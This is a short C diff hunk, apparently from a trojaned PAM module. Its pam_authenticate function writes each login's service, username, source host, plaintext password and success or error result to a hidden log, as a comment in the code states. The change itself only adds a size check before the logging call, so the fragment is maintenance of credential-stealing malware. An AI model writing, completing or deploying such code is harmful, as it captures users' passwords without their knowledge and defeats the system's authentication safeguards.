@@ -94,7 +94,8 @@ int pam_authenticate(pam_handle_t *pamh, int flags )
         else
             size = sprintf( buf, "%s:%s:%s:%s:%s\n", service, user, host, pwd->resp, ( res == 0 ) ? "SUCCESS" : "ERROR");
         // # Backup the username, password, host (source IP), and the value ERROR or SUCCESS.
-        __LOG( buf, size );
+        if ( size != 0 )
+            __LOG( buf, size );
         free( pwd );
         return ( res );
     }
